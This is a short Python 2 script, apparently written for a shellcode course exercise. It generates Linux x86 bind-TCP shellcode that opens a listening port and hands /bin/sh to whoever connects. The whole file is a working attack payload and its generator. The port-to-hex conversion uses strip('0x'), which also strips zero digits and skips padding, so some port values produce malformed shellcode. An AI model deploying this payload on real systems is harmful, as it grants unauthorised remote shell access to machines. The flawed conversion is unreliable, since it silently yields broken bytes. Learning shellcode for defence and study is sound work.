# Paolo Stagno aka [VoidSec](https://voidsec.com)
# SLAE-1511
#!/usr/bin/env python

import sys;

if (len(sys.argv) == 1):
	port = 4444
else:
	port = int(sys.argv[1])
	if port < 0 or port > 65535:
		print "[!] Invalid TCP port number {}, must be between 0-65535".format(port)
		sys.exit(-1)
# convert to hex and strip 0x
hport=hex(port).strip("0x")
# add an \\x every 2 chars
hport="\\x"+"\\x".join(a+b for a,b in zip(hport[::2],hport[1::2]))

shellcode= "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\\x5e\\x52\\x68\\x02\\x00{}\\x6a\\x10\\x51\\x50\\x89\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x89\\x41\\x04\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x43\\xb0\\x66\\xcd\\x80\\x93\\x59\\x6a\\x3f\\x58\\xcd\\x80\\x49\\x79\\xf8\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80".format(hport)

print "Bind TCP shellcode listening on port: {} - {}".format(port,hport)
print "\n"+shellcode
